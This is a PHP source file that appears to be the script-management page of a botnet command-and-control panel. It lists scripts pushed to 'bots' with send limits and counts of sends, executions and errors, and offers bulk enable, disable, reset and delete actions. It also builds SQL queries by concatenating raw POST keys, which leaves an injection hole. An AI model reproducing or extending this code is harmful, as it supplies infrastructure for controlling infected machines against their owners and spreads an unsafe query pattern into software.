<?php

define("TPL_TITLE", "Scripts");

define("SCRIPT_DISABLE", 0);
define("SCRIPT_ENABLE", 1);
define("SCRIPT_DELETE", 2);
define("SCRIPT_RESET", 3);

if (!CsrConnectToDb()) die();

if (isset($_POST["do"]) && isset($_POST["id"])) 
{
	$sql = '';
	$type = $_POST["act_type"];
	
	$where = ' where ';
	foreach ($_POST["id"] as $id => $v) $where .= "`id` = " . $id . " or ";
	$where = substr($where, 0, -4);
	
	if ($type == SCRIPT_ENABLE || $type == SCRIPT_DISABLE) {
		$sql .= "update `scripts` set `flag_enabled` = " . $type;
	}
	else if ($type == SCRIPT_RESET) 
	{
		$scripts = CsrSqlQueryRows("select `id`, `extern_id` from `scripts` " . $where);
		foreach ($scripts as $script) 
		{
			CsrSqlQuery("update `scripts` set `flag_enabled` = 1, `extern_id` = '" . addslashes(md5($script['extern_id'] . CURRENT_TIME, true)) . "' where `id` = " . $script["id"] . " limit 1");
			CsrSqlQuery("delete from `scripts_stat` where `extern_id` = '" . addslashes($script['extern_id']) . "'");
		}
	}
	else {
		$sql .= "delete from `scripts`";
	}
	
	$sql .= $where . " limit " . count($_POST["id"]);
	CsrSqlQuery($sql);
}

$scripts = CsrSqlQueryRows("select `id`, `extern_id`, `name`, `time_created`, `flag_enabled`, `send_limit` from `scripts` order by `time_created` desc");
ob_start();
?>

<div class="row">
	<div class="col-md-2">
		 <a href="<?CORE_FILE?>?act=script&do=new"> <button class="btn btn-info btn-sm"> Create new script </button> </a>
	</div>
	
	<form method="post">
	<? if (count($scripts) > 0) { ?>
	<div class="col-md-2 pull-right">
		<select name='act_type'>
			<option value="<?=SCRIPT_ENABLE?>"> Enable </option>
			<option value="<?=SCRIPT_DISABLE?>"> Disable </option>
			<option value="<?=SCRIPT_RESET?>"> Reset </option>
			<option value="<?=SCRIPT_DELETE?>"> Delete </option>
		</select>
		<button class="btn btn-default btn-xs pull-right" name="do"> >> </button>
	</div>
	<? } ?>
</div>
<br/>
<? if (count($scripts) > 0) { ?>

<script type='text/javascript'>
var is_check = false;
function CheckAll() {
	is_check = !is_check;
	var elms = document.getElementsByClassName("bot_id");
	for (var i = 0; i < elms.length; ++i) elms[i].checked = is_check;
}
</script>

<div class="row">
	<div class="col-md-12">
	<table class="table table-striped table-bordered table-condensed table-hover">
		<tr>
			<th class="col-md-4"> Name </th> 
			<th> Status </th> 
			<th> Creation time </th> 
			<th> Limit of sended </th> 
			<th> Sended </th>  
			<th> Executes </th>  
			<th> Errors </th>  
			<th width='12px'> <input onclick="CheckAll()" type="checkbox"/> </th>
		</tr>
		<?php 
		foreach ($scripts as &$script)
		{
			$sum = CsrSqlQueryRow("select sum(if(`type` = 1, 1, 0)) as `sended`, sum(if(`type` = 2, 1, 0)) as `executes`, sum(if(`type` > 2, 1, 0)) as `errors` from `scripts_stat` where `extern_id` = '" . addslashes($script["extern_id"]) . "'");

			if (!isset($sum["sended"])) $sum["sended"] = 0;
			if (!isset($sum["executes"])) $sum["executes"] = 0;
			if (!isset($sum["errors"])) $sum["errors"] = 0;
			
			?>
			<tr>
				<td><a href="<?CORE_FILE?>?act=script&do=edit&id=<?=$script["id"]?>"><?=$script["name"]?></a></td>
				<td><?=$script["flag_enabled"] ? "Enabled" : "Disabled"?></td>
				<td><?=date("d-m-Y H:i:s", $script["time_created"])?></td>
				<td><?=$script["send_limit"]?></td>
				<td><?=$sum["sended"]?></td>
				<td><?=$sum["executes"]?></td>
				<td><?=$sum["errors"]?></td>
				<td><input class='bot_id' name='id[<?=$script["id"]?>]' type="checkbox"/></td>
			</tr>
			<?php } ?>
	</table>
	</div>
</div>
</form>
<? } ?>
<?php
$content = ob_get_contents();
ob_end_clean();

$header_tpl = file_get_contents(TPL_PATH . "header.html");
$header_tpl = str_replace(array("{TPL}", "{SCRIPTS}", "{TITLE}"), array(TPL_PATH, "", TPL_TITLE), $header_tpl);

$menu_tpl = file_get_contents(TPL_PATH . "menu.html");
$menu_tpl = str_replace(array("{CORE_FILE}", "{CUR_TIME}", "{SCRIPTS_ACTIVE}"), array(CORE_FILE, gmdate("M d Y H:i:s", mktime()), "active"), $menu_tpl);

$body_tpl = file_get_contents(TPL_PATH . "body.html");
$body_tpl = str_replace(array("{MENU}", "{BODY_CLASS}", "{CONTENT}"), array($menu_tpl, "bots", $content), $body_tpl);
$footer_tpl = file_get_contents(TPL_PATH . "footer.html");

echo str_replace(array("{HEADER}", "{BODY}", "{FOOTER}"), array($header_tpl, $body_tpl, $footer_tpl), file_get_contents(TPL_PATH . "main.html"));
?>